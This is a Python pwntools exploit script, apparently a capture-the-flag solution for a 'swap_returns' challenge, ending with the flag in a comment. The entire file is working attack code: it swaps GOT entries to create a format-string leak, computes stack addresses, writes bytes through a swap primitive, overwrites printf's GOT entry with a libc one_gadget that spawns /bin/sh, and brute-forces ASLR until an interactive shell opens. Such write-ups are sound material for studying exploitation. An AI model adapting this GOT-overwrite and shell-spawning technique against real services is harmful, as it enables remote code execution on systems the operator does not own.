#!/usr/bin/env python

from __future__ import print_function
from pwn import *

context.update(os='linux', arch='amd64',
	# log_level='debug',
)

elf = ELF('swap_returns')

def attempt():
	t = remote(args['HOST'] or 'localhost', args['PORT'] or 37567)

	def prepare(addr1, addr2):
		t.sendline('1')
		# t.recvuntil('1st')
		t.sendline(str(addr1))
		# t.recvuntil('2nd')
		t.sendline(str(addr2))

	def swap():
		t.sendline('2')

	t.sendline('5')

	prepare(elf.got['atoi'], elf.got['printf'])
	swap()

	# do the leak
	t.send('%p')
	t.recvuntil('0x')
	stack_addr = int(t.recvuntil('1. Set', drop=True), 16)
	log.debug('Stack addr %x', stack_addr)

	t.send('ab') # calls item 2 => swap

	main_rbp = stack_addr + 0x7fff332788a0 - 0x7fff33278856
	main_rsp = stack_addr + 0x7fff33278870 - 0x7fff33278856
	swap_addr_1 = main_rbp - 0x20
	swap_addr_2 = main_rbp - 0x18
	read_int_buf = main_rsp - 0x10 - 0xa
	char_workspace = 0x601200
	log.debug('Read buf %x', read_int_buf)

	def write_char(ch, addr):
		prepare(char_workspace + ord(ch), swap_addr_1)
		swap()
		prepare(char_workspace + ord(ch), addr)
		swap()

	def write_data(data, addr):
		# clobbers 7 bytes after the last byte
		for i, ch in enumerate(data):
			write_char(ch, i + addr)

	bss_scratch = 0x601100

	one_gadget = 0x45526 #	execve("/bin/sh", rsp+0x30, environ)
	# constraints:
	#   rax == NULL

	# one_gadget = 0x4557a #	execve("/bin/sh", rsp+0x30, environ)
	# constraints:
	#   [rsp+0x30] == NULL

	# one_gadget = 0xf1651 #	execve("/bin/sh", rsp+0x40, environ)
	# constraints:
	#   [rsp+0x40] == NULL

	# one_gadget = 0xf24cb #	execve("/bin/sh", rsp+0x60, environ)
	# constraints:
	#   [rsp+0x60] == NULL

	# one_gadget += int(raw_input('libc base'), 16)

	prepare(elf.got['printf'], bss_scratch)
	swap()
	write_data(p64(one_gadget)[:3], bss_scratch + 0x10)
	prepare(bss_scratch + 3, bss_scratch + 0x13)
	swap()

	prepare(elf.got['printf'], bss_scratch + 0x10)
	swap()

	t.sendline('5')
	t.sendline('ls')
	result = t.clean(timeout=3)
	if not t.connected():
		return False
	log.hexdump(result)
	os.system('printf "\x07"')
	t.interactive()
	return True

with log.progress('Bruteforcing ASLR') as prog:
	count = 0
	while True:
		prog.status('Attempt %d', count)
		if attempt():
			break
		count += 1

# TWCTF{unlimited_SWAP_Works}
